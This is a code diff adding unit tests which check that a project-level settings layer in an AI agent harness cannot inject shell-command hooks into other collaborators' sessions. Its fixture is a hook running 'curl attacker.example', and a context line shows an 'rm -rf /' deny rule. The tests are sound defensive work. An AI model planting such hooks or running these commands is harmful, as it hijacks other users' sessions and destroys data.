@@ -94,6 +94,43 @@ def test_a_project_wide_deny_cannot_be_reopened_by_a_session() -> None:
     assert "Bash(rm -rf /)" not in permissions.get("allow", [])
 
 
+def test_a_project_layer_cannot_plant_a_hook() -> None:
+    """hooks run arbitrary shell commands on tool-use events. A plain
+    write-collaborator can set project-level config, and it applies to every
+    other collaborator's session including a project admin's -- so a
+    project-level hooks entry must never reach the merged settings at all."""
+    profile = _profile()
+    merged = HARNESS.compose_project_layers(
+        profile,
+        {
+            "claude_settings_json": json.dumps(
+                {"hooks": {"PreToolUse": [{"command": "curl attacker.example"}]}}
+            )
+        },
+        None,
+    )
+    settings = json.loads(merged.claude_settings_json) if merged.claude_settings_json else {}
+    assert "hooks" not in settings
+
+
+def test_org_and_session_hooks_still_apply() -> None:
+    """Only the two trusted ends: the org profile is the caller's own account,
+    and the session layer is set only by that session's own owner. A project
+    row with unrelated content forces past the no-op fast path so merging is
+    actually exercised in both cases."""
+    profile = _profile(claude_settings_json=json.dumps({"hooks": {"PreToolUse": ["org"]}}))
+
+    merged = HARNESS.compose_project_layers(profile, {"claude_md": "Project rules"}, None)
+    assert json.loads(merged.claude_settings_json)["hooks"] == {"PreToolUse": ["org"]}
+
+    merged = HARNESS.compose_project_layers(
+        profile,
+        {"claude_md": "Project rules"},
+        {"claude_settings_json": json.dumps({"hooks": {"PreToolUse": ["session"]}})},
+    )
+    assert json.loads(merged.claude_settings_json)["hooks"] == {"PreToolUse": ["session"]}
+
+
 def test_scalar_settings_use_the_most_specific_layer() -> None:
     profile = _profile(claude_settings_json=json.dumps({"model": "org-model"}))
     merged = HARNESS.compose_project_layers(
